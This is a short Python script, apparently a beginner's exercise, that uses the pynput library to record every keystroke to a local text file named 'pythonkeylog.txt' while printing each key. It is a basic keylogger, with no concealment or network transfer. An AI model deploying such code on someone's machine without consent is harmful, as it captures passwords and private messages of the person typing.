from pynput.keyboard import Listener, Key

def pressed(key): 
    print(f"Key pressed: {key}")
    with open("pythonkeylog.txt", "a") as f:
        f.write(str(key))

        return True
    

with Listener(on_press=pressed) as listener:
    listener.join()
